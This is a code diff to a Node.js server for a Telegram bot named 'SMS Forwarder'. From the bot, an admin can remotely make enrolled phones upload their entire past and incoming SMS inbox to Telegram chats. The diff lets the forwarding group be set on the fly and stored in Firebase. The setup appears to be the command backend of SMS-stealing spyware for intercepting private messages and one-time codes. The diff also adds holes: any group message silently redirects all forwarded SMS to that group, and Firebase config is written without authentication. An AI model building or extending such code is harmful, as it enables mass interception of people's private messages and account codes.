@@ -19,6 +19,7 @@ app.use(express.urlencoded({ extended: true }));
 
 // In-Memory Device Storage: deviceId -> object
 const devices = new Map();
+let currentGroupChatId = GROUP_CHAT_ID;
 
 // File Persistence
 function loadDevices() {
@@ -47,7 +48,37 @@ function saveDevices() {
   }
 }
 
-// Firebase Realtime Sync
+// Firebase Config Sync
+async function fetchConfigFromFirebase() {
+  try {
+    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/config.json`;
+    const response = await fetch(url);
+    if (response.ok) {
+      const data = await response.json();
+      if (data && data.groupChatId) {
+        currentGroupChatId = data.groupChatId;
+        console.log(`[Config] Loaded groupChatId from Firebase: ${currentGroupChatId}`);
+      }
+    }
+  } catch (err) {
+    console.error(`[Config Fetch Error]`, err.message);
+  }
+}
+
+async function updateFirebaseConfig(patchData) {
+  try {
+    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/config.json`;
+    await fetch(url, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(patchData)
+    });
+  } catch (err) {
+    console.error(`[Config Update Error]`, err.message);
+  }
+}
+
+// Firebase Realtime Devices Sync
 async function fetchDevicesFromFirebase() {
   try {
     const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/devices.json`;
@@ -98,8 +129,9 @@ async function updateDeviceInFirebase(devId, patchData) {
   }
 }
 
-// Load persisted devices on startup
+// Load persisted devices and config on startup
 loadDevices();
+fetchConfigFromFirebase();
 fetchDevicesFromFirebase();
 
 // Initialize Telegram Bot
@@ -235,6 +267,7 @@ app.get('/', (req, res) => {
     app: 'SMS Forwarder Telegram Bot',
     connectedDevices: devices.size,
     firebaseUrl: FIREBASE_DATABASE_URL,
+    groupChatId: currentGroupChatId,
     timestamp: new Date().toISOString()
   });
 });
@@ -286,7 +319,7 @@ app.post('/api/forward-sms', async (req, res) => {
 
   const targets = new Set();
   if (ADMIN_CHAT_ID) targets.add(ADMIN_CHAT_ID);
-  if (GROUP_CHAT_ID) targets.add(GROUP_CHAT_ID);
+  if (currentGroupChatId) targets.add(currentGroupChatId);
 
   try {
     for (const targetId of targets) {
@@ -304,7 +337,7 @@ const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 SMS Forwarder Bot Server running on port ${PORT}`);
   console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
   console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
-  if (GROUP_CHAT_ID) console.log(`👥 Group Chat ID: ${GROUP_CHAT_ID}`);
+  if (currentGroupChatId) console.log(`👥 Group Chat ID: ${currentGroupChatId}`);
   console.log(`🔗 External URL: ${RENDER_EXTERNAL_URL}`);
   console.log(`🔥 Firebase URL: ${FIREBASE_DATABASE_URL}`);
   console.log(`💾 Persisted Devices: ${devices.size}`);
@@ -328,17 +361,25 @@ bot.on('message', async (msg) => {
   const chatType = msg.chat.type;
   const text = (msg.text || '').trim();
 
-  // Fetch latest devices from Firebase on any command
-  await fetchDevicesFromFirebase();
-
+  // Handle Group Registration
   if (chatType === 'group' || chatType === 'supergroup' || chatType === 'channel') {
-    if (text.startsWith('/') || text.toLowerCase().includes('groupid') || text.toLowerCase().includes('id')) {
-      const groupTitle = msg.chat.title || 'Telegram Group';
-      const groupReply = `📌 *TELEGRAM GROUP DETAILS*\n━━━━━━━━━━━━━━━━━━━━━\n🏷️ *Group Title:* \`${groupTitle}\`\n🆔 *Group Chat ID:* \`${chatId}\`\n━━━━━━━━━━━━━━━━━━━━━\n_Set \`GROUP_CHAT_ID=${chatId}\` in Render Environment Variables!_`;
-      return bot.sendMessage(chatId, groupReply, { parse_mode: 'Markdown' });
-    }
-    return;
+    currentGroupChatId = chatId;
+    await updateFirebaseConfig({ groupChatId: chatId });
+
+    const groupTitle = msg.chat.title || 'Telegram Group';
+    const groupReply = `📌 *TELEGRAM GROUP REGISTERED*
+━━━━━━━━━━━━━━━━━━━━━
+🏷️ *Group Title:* \`${groupTitle}\`
+🆔 *Group Chat ID:* \`${chatId}\`
+━━━━━━━━━━━━━━━━━━━━━
+✅ *Group registered for SMS forwarding!* All incoming SMS and inbox syncs will now be posted directly into this group.`;
+
+    return bot.sendMessage(chatId, groupReply, { parse_mode: 'Markdown' });
   }
+
+  // Fetch latest devices from Firebase on any command
+  await fetchConfigFromFirebase();
+  await fetchDevicesFromFirebase();
 
   if (!isAdmin(chatId)) {
     return bot.sendMessage(chatId, '❌ Unauthorized user.');
@@ -384,7 +425,7 @@ bot.on('message', async (msg) => {
       if ((now - new Date(d.lastSeen)) < 5 * 60 * 1000) onlineCount++;
     });
 
-    const statusText = `📊 *SYSTEM OVERALL STATUS*\n━━━━━━━━━━━━━━━━━━━━━\n🌐 *Bot Server:* 🟢 Online (Node.js)\n🔥 *Firebase Realtime:* 🟢 Synced\n📱 *Total Connected Devices:* ${devices.size}\n🟢 *Online Devices:* ${onlineCount}\n🔴 *Offline Devices:* ${devices.size - onlineCount}\n━━━━━━━━━━━━━━━━━━━━━\n_Select \`📱 Connected Devices\` from bottom menu to view individual devices._`;
+    const statusText = `📊 *SYSTEM OVERALL STATUS*\n━━━━━━━━━━━━━━━━━━━━━\n🌐 *Bot Server:* 🟢 Online (Node.js)\n🔥 *Firebase Realtime:* 🟢 Synced\n👥 *Group Chat ID:* \`${currentGroupChatId || 'Not Configured'}\`\n📱 *Total Connected Devices:* ${devices.size}\n🟢 *Online Devices:* ${onlineCount}\n🔴 *Offline Devices:* ${devices.size - onlineCount}\n━━━━━━━━━━━━━━━━━━━━━\n_Select \`📱 Connected Devices\` from bottom menu to view individual devices._`;
     return bot.sendMessage(chatId, statusText, {
       parse_mode: 'Markdown',
       reply_markup: buildMainReplyKeyboard()
@@ -433,6 +474,7 @@ bot.on('callback_query', async (query) => {
     return bot.answerCallbackQuery(query.id, { text: '❌ Unauthorized' });
   }
 
+  await fetchConfigFromFirebase();
   await fetchDevicesFromFirebase();
 
   if (data === 'dev_list') {
@@ -497,7 +539,10 @@ bot.on('callback_query', async (query) => {
         reply_markup: buildSmsSettingsKeyboard(devId)
       });
       bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled' });
-      bot.sendMessage(chatId, `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\n📥 All past inbox SMS, new, and upcoming SMS will be uploaded and forwarded to this bot.`, { parse_mode: 'Markdown' });
+
+      const onMsg = `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\n📥 All past inbox SMS, new, and upcoming SMS will be uploaded and forwarded.`;
+      if (ADMIN_CHAT_ID) bot.sendMessage(ADMIN_CHAT_ID, onMsg, { parse_mode: 'Markdown' });
+      if (currentGroupChatId && currentGroupChatId !== ADMIN_CHAT_ID) bot.sendMessage(currentGroupChatId, onMsg, { parse_mode: 'Markdown' });
       break;
 
     case 'sms_off':
@@ -513,7 +558,10 @@ bot.on('callback_query', async (query) => {
         reply_markup: buildSmsSettingsKeyboard(devId)
       });
       bot.answerCallbackQuery(query.id, { text: '🔴 SMS Forwarding Disabled' });
-      bot.sendMessage(chatId, `🔴 *SMS Forwarding Disabled* for \`${dev.deviceAlias}\`.\n\nUpcoming SMS messages will be stopped.`, { parse_mode: 'Markdown' });
+
+      const offMsg = `🔴 *SMS Forwarding Disabled* for \`${dev.deviceAlias}\`.\n\nUpcoming SMS messages will be stopped.`;
+      if (ADMIN_CHAT_ID) bot.sendMessage(ADMIN_CHAT_ID, offMsg, { parse_mode: 'Markdown' });
+      if (currentGroupChatId && currentGroupChatId !== ADMIN_CHAT_ID) bot.sendMessage(currentGroupChatId, offMsg, { parse_mode: 'Markdown' });
       break;
 
     case 'rename':
